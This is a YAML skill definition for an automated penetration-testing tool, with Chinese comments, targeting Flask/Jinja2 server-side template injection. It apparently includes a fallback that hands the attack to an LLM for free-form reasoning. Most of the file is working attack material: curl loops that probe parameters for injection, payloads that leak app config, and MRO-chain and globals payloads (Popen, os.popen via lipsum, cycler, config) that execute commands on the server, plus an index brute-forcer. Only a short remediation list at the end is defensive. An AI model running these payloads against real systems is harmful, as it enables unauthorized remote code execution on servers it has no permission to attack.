# ═══════════════════════════════════════════════════════════
# Flask / Jinja2 SSTI (Server-Side Template Injection)
#
# 原理: 用户输入被直接拼接到 Jinja2 模板中渲染
#       通过 Python MRO 链遍历到 os/subprocess 模块 → RCE
# 关键: 找到注入点 → 确认模板引擎 → 构造 MRO 链
# ═══════════════════════════════════════════════════════════
skill_id: flask_ssti_rce
name: "Flask/Jinja2 服务端模板注入 RCE"
category: web_rce
version: "1.0"

principle: |
  SSTI 的本质是用户输入未经转义地被嵌入服务端模板引擎中执行。
  
  Jinja2 模板引擎的沙箱限制了直接访问内置函数，但可以通过
  Python 的 MRO（方法解析顺序）链绕过：
  
  1. 从任意对象（如空字符串 ''）出发
  2. 通过 __class__.__mro__ 回溯到 object 基类
  3. 通过 __subclasses__() 遍历所有子类
  4. 找到能执行命令的类（如 os._wrap_close、subprocess.Popen）
  5. 调用其方法执行系统命令
  
  经典 payload: {{''.__class__.__mro__[1].__subclasses__()}}
  然后从子类列表中找到可用的命令执行类。
  
  注入点通常在:
  - URL 参数（?name={{7*7}}）
  - POST 表单字段
  - HTTP 头（Host, User-Agent 等，少见但存在）
  - 路由路径本身（Flask 动态路由）
  
  检测方法:
  - 发送 {{7*7}}，页面返回 49 → Jinja2
  - 发送 ${7*7}，页面返回 49 → FreeMarker/其他
  - 发送 {{7*'7'}}，返回 7777777 → Jinja2 确认

match:
  rules:
    - fingerprint_contains: ["flask"]
    - fingerprint_contains: ["jinja2", "jinja"]
    - fingerprint_contains: ["werkzeug"]
    - evidence_contains: ["ssti", "template injection"]
    - evidence_contains: ["49"]  # {{7*7}} 的结果

probes:
  - id: find_ssti_param
    description: "在常见参数中探测 SSTI 注入点"
    steps:
      # 测试 GET 参数
      - command: |
          for param in name user input q search query text msg content data value cmd; do
            result=$(curl -s -G --data-urlencode "${param}={{7*7}}" {ENDPOINT} --max-time 8 2>/dev/null)
            if echo "$result" | grep -q "49"; then
              echo "SSTI_FOUND:GET:${param}"
              break
            fi
          done
          # 也测试路径中是否有反射
          result=$(curl -s "{ENDPOINT}/{{7*7}}" --max-time 8 2>/dev/null)
          if echo "$result" | grep -q "49"; then
            echo "SSTI_FOUND:PATH:/"
          fi
        parse_rules:
          - if_regex: "SSTI_FOUND:(GET|POST|PATH):(.+)"
            set: { ssti_confirmed: true, ssti_method: "detected" }

      # 测试 POST 参数
      - command: |
          for param in name user input q content data; do
            result=$(curl -s -X POST {ENDPOINT} --data-urlencode "${param}={{7*7}}" --max-time 8 2>/dev/null)
            if echo "$result" | grep -q "49"; then
              echo "SSTI_POST_FOUND:${param}"
              break
            fi
          done
        parse_rules:
          - if_regex: "SSTI_POST_FOUND:(.+)"
            set: { ssti_confirmed: true, ssti_post_param: "detected" }

  - id: confirm_jinja2
    description: "确认是 Jinja2 引擎（区分其他模板引擎）"
    depends_on: { ssti_confirmed: true }
    steps:
      - command: |
          # Jinja2 特有: 字符串乘法
          curl -s -G --data-urlencode "name={{7*'7'}}" {ENDPOINT} --max-time 8
        parse_rules:
          - if_contains: ["7777777"]
            set: { engine_jinja2: true }

      - command: |
          # Jinja2: 可以访问 config
          curl -s -G --data-urlencode "name={{config}}" {ENDPOINT} --max-time 8
        parse_rules:
          - if_contains: ["SECRET_KEY", "DEBUG"]
            set: { engine_jinja2: true, config_leaked: true }

exploit_paths:
  # ═══ 路径 A: os._wrap_close RCE（最常见的 MRO 链）═══
  - path_id: mro_popen
    name: "MRO 链 subprocess.Popen RCE"
    priority: 1
    principle: |
      遍历 object 的所有子类，找到可以执行命令的类。
      不同 Python 版本子类索引不同，需要自动定位。
    conditions:
      ssti_confirmed: true
    steps:
      - id: find_popen_index
        description: "自动查找 Popen 在子类列表中的索引"
        command: |
          # 先获取子类列表，找 Popen 或 os._wrap_close 的索引
          output=$(curl -s -G \
            --data-urlencode "name={{''.__class__.__mro__[1].__subclasses__()}}" \
            {ENDPOINT} --max-time 10)
          # 用 Python 解析索引
          python3 -c "
          import re, sys
          text = '''$output'''
          # 找所有类名
          classes = re.findall(r\"<class '([^']+)'>\", text)
          for i, c in enumerate(classes):
              if 'Popen' in c:
                  print(f'POPEN_INDEX:{i}')
                  sys.exit(0)
              if '_wrap_close' in c:
                  print(f'WRAP_CLOSE_INDEX:{i}')
          # 找 warnings.catch_warnings 作为备选
          for i, c in enumerate(classes):
              if 'catch_warnings' in c:
                  print(f'CATCH_WARNINGS_INDEX:{i}')
                  break
          if not classes:
              print('NO_SUBCLASSES_FOUND')
          " 2>/dev/null || echo "PARSE_ERROR"
        timeout: 20
        success_criteria:
          stdout_contains_any: ["POPEN_INDEX", "WRAP_CLOSE_INDEX", "CATCH_WARNINGS_INDEX"]
        on_success: mro_rce_auto
        on_fail: mro_rce_bruteforce

      - id: mro_rce_auto
        description: "用找到的索引执行命令"
        command: |
          # 尝试常见的 Popen payload
          curl -s -G \
            --data-urlencode "name={{''.__class__.__mro__[1].__subclasses__()[{POPEN_IDX}]('id',shell=True,stdout=-1).communicate()[0].decode()}}" \
            {ENDPOINT} --max-time 10
        timeout: 15
        success_criteria:
          stdout_contains_any: ["uid="]
        on_success: conclude_success
        on_fail: mro_rce_bruteforce
        evidence_capture:
          shell_type: "rce_ssti_popen"

      - id: mro_rce_bruteforce
        description: "暴力尝试常见的子类索引"
        command: |
          python3 -c "
          import subprocess, sys
          # 常见的 Popen/os._wrap_close 索引（不同 Python 版本）
          payloads = [
              # os._wrap_close → popen
              \"{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}\",
              \"{{''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['popen']('id').read()}}\",
              \"{{''.__class__.__mro__[1].__subclasses__()[140].__init__.__globals__['popen']('id').read()}}\",
              # 直接 Popen
              \"{{''.__class__.__mro__[1].__subclasses__()[258]('id',shell=True,stdout=-1).communicate()[0].decode()}}\",
              \"{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0].decode()}}\",
              # config + os
              \"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\",
              # lipsum
              \"{{lipsum.__globals__['os'].popen('id').read()}}\",
              # cycler
              \"{{cycler.__init__.__globals__.os.popen('id').read()}}\",
              # request
              \"{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}\",
          ]
          for i, p in enumerate(payloads):
              r = subprocess.run(
                  ['curl', '-s', '-G', '--data-urlencode', f'name={p}', '{ENDPOINT}', '--max-time', '8'],
                  capture_output=True, text=True, timeout=15
              )
              if 'uid=' in r.stdout:
                  print(f'PAYLOAD_{i}_SUCCESS')
                  print(r.stdout[:500])
                  sys.exit(0)
          print('ALL_PAYLOADS_FAILED')
          "
        timeout: 120
        success_criteria:
          stdout_contains_any: ["uid=", "SUCCESS"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_ssti_bruteforce"

  # ═══ 路径 B: POST 参数 SSTI ═══
  - path_id: post_ssti
    name: "POST 参数 SSTI RCE"
    priority: 2
    conditions:
      ssti_confirmed: true
    steps:
      - id: post_lipsum
        description: "通过 POST 参数 + lipsum 全局对象执行命令"
        command: |
          curl -s -X POST {ENDPOINT} \
            --data-urlencode "name={{lipsum.__globals__['os'].popen('id').read()}}" \
            --max-time 10
        timeout: 15
        success_criteria:
          stdout_contains_any: ["uid="]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_ssti_post"

  # ═══ 路径 C: LLM 兜底 ═══
  - path_id: llm_freeform
    name: "LLM 自由推理"
    priority: 99
    mode: react_freeform
    max_rounds: 5
    conditions:
      ssti_confirmed: true

remediation: |
  1. 永远不要将用户输入直接拼接到模板字符串中
  2. 使用 render_template() 并通过参数传递变量
  3. 启用 Jinja2 沙箱模式: jinja2.sandbox.SandboxedEnvironment
  4. 对用户输入做严格的白名单过滤
